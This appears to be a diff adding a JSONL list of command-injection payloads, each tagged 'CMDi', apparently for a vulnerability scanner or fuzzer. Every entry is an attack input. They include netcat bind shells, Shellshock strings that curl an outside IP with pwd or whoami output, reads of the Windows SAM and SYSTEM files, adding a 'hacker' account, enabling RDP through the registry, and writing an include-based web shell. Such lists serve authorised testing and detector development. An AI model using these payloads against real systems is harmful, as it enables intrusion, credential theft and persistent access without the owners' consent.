+{"payload": "<?php system(\"echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\");?>", "type": "CMDi"}
+{"payload": "& netstat -an", "type": "CMDi"}
+{"payload": "{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}", "type": "CMDi"}
+{"payload": "{${sleep(hexdec(dechex(20)))}}", "type": "CMDi"}
+{"payload": "| type %SYSTEMROOT%\\repair\\SYSTEM", "type": "CMDi"}
+{"payload": "eval('whoami');", "type": "CMDi"}
+{"payload": "eval('pwd')", "type": "CMDi"}
+{"payload": "{${phpinfo()}}", "type": "CMDi"}
+{"payload": "; wget https://crowdshield.com/.testing/rce_vuln.txt", "type": "CMDi"}
+{"payload": "%0a", "type": "CMDi"}
+{"payload": "&& curl https://crowdshield.com/.testing/rce_vuln.txt", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"sleep 3 && echo vulnerable 3\"", "type": "CMDi"}
+{"payload": ";echo '<script>alert(1)</script>'", "type": "CMDi"}
+{"payload": "| phpinfo()", "type": "CMDi"}
+{"payload": "echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX", "type": "CMDi"}
+{"payload": "; ipconfig /all", "type": "CMDi"}
+{"payload": "perl -e 'print \"X\"x16384'", "type": "CMDi"}
+{"payload": "|| perl -e 'print \"X\"x16096'", "type": "CMDi"}
+{"payload": "$(`type C:\\boot.ini`)", "type": "CMDi"}
+{"payload": "which nc", "type": "CMDi"}
+{"payload": "&&id", "type": "CMDi"}
+{"payload": "| curl http://crowdshield.com/.testing/rce.txt", "type": "CMDi"}
+{"payload": "&& dir C:\\Documents and Settings\\*", "type": "CMDi"}
+{"payload": "; netstat -an", "type": "CMDi"}
+{"payload": "\\necho INJECTX\\nexit\\n\\033[2Asleep 5\\n", "type": "CMDi"}
+{"payload": "&& ifconfig", "type": "CMDi"}
+{"payload": "| echo \"<?php include($_GET['page'])| ?>\" > rfi.php", "type": "CMDi"}
+{"payload": "& dir C:\\Documents and Settings\\*", "type": "CMDi"}
+{"payload": "& nc -lvvp 4444 -e /bin/sh&", "type": "CMDi"}
+{"payload": "perl -e 'print \"X\"x8192'", "type": "CMDi"}
+{"payload": "&& net view", "type": "CMDi"}
+{"payload": "a;id|", "type": "CMDi"}
+{"payload": "| nc -lvvp 4444 -e /bin/sh|", "type": "CMDi"}
+{"payload": "&&dir", "type": "CMDi"}
+{"payload": "& sleep 10", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\\`pwd\\`\"", "type": "CMDi"}
+{"payload": "& whoami", "type": "CMDi"}
+{"payload": "&& ls -l /var/www/*", "type": "CMDi"}
+{"payload": "perl -e 'print \"X\"x1024'", "type": "CMDi"}
+{"payload": "' || whoami", "type": "CMDi"}
+{"payload": "\" | whoami", "type": "CMDi"}
+{"payload": "`ping 127.0.0.1`", "type": "CMDi"}
+{"payload": "; perl -e 'print \"X\"x2048'", "type": "CMDi"}
+{"payload": "<?php system(\"sleep 5\");?>", "type": "CMDi"}
+{"payload": "ifconfig", "type": "CMDi"}
+{"payload": "|| sleep 15", "type": "CMDi"}
+{"payload": "eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')", "type": "CMDi"}
+{"payload": "&& perl -e 'print \"X\"x16096'", "type": "CMDi"}
+{"payload": "& ls -l /etc/", "type": "CMDi"}
+{"payload": "echo '<script>alert(1)</script>'// XXXXXXXXXXX", "type": "CMDi"}
+{"payload": "system('pwd');", "type": "CMDi"}
+{"payload": "& type %SYSTEMROOT%\\repair\\SYSTEM", "type": "CMDi"}
+{"payload": ";phpinfo();//", "type": "CMDi"}
+{"payload": "; curl https://crowdshield.com/.testing/rce_vuln.txt", "type": "CMDi"}
+{"payload": "ls", "type": "CMDi"}
+{"payload": "system('pwd')", "type": "CMDi"}
+{"payload": "|/usr/bin/id", "type": "CMDi"}
+{"payload": "; sleep 1", "type": "CMDi"}
+{"payload": "; sleep 15", "type": "CMDi"}
+{"payload": "{{ get_user_file(\"/etc/passwd\") }}", "type": "CMDi"}
+{"payload": "&& whoami", "type": "CMDi"}
+{"payload": "() { :;}; /bin/bash -c \"sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8\"", "type": "CMDi"}
+{"payload": "$(`ls`)", "type": "CMDi"}
+{"payload": "| system('sleep 5');", "type": "CMDi"}
+{"payload": "; system('curl https://crowdshield.com/.testing/rce_vuln.txt');", "type": "CMDi"}
+{"payload": "& net user hacker Password1 /ADD", "type": "CMDi"}
+{"payload": "eval('pwd');", "type": "CMDi"}
+{"payload": "&& perl -e 'print \"X\"x2048'", "type": "CMDi"}
+{"payload": "&& type C:\\WINNT\\repair\\SAM", "type": "CMDi"}
+{"payload": "& perl -e 'print \"X\"x2048'", "type": "CMDi"}
+{"payload": "| sleep 1", "type": "CMDi"}
+{"payload": "&& sysinfo", "type": "CMDi"}
+{"payload": "%0A/usr/bin/id", "type": "CMDi"}
+{"payload": "system('curl https://sn1persecurity.com/.testing/rce_vuln.txt');", "type": "CMDi"}
+{"payload": "| perl -e 'print \"X\"x16096'", "type": "CMDi"}
+{"payload": ";id", "type": "CMDi"}
+{"payload": "&& dir C:\\", "type": "CMDi"}
+{"payload": "test* || perl -e 'print \"X\"x16096'", "type": "CMDi"}
+{"payload": "$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)", "type": "CMDi"}
+{"payload": "& ls -l /home/*", "type": "CMDi"}
+{"payload": "| reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "type": "CMDi"}
+{"payload": "{${sleep(3)}}", "type": "CMDi"}
+{"payload": "& system('sleep 5');", "type": "CMDi"}
+{"payload": "$(`wget https://crowdshield.com/.testing/rce_vuln.txt`)", "type": "CMDi"}
+{"payload": "\\n\\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\\`whoami\\`", "type": "CMDi"}
+{"payload": "| type C:\\WINNT\\repair\\SAM", "type": "CMDi"}
+{"payload": "\\n/bin/ls -al\\n", "type": "CMDi"}
+{"payload": "& ls -l /var/www/*", "type": "CMDi"}
+{"payload": "sleep 10", "type": "CMDi"}
+{"payload": "& pwd", "type": "CMDi"}
+{"payload": "<?php system(\"curl https://crowdshield.com/.testing/rce_vuln.txt?req=df2fkjj\");?>", "type": "CMDi"}
+{"payload": "; ls -l /home/*", "type": "CMDi"}
+{"payload": "'", "type": "CMDi"}
+{"payload": "& dir", "type": "CMDi"}
+{"payload": "&& type %SYSTEMROOT%\\repair\\SYSTEM", "type": "CMDi"}
+{"payload": ";netstat -a;", "type": "CMDi"}
+{"payload": "&& perl -e 'print \"X\"x8096'", "type": "CMDi"}
+{"payload": "test*; perl -e 'print \"X\"x16096'", "type": "CMDi"}
+{"payload": "system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')", "type": "CMDi"}
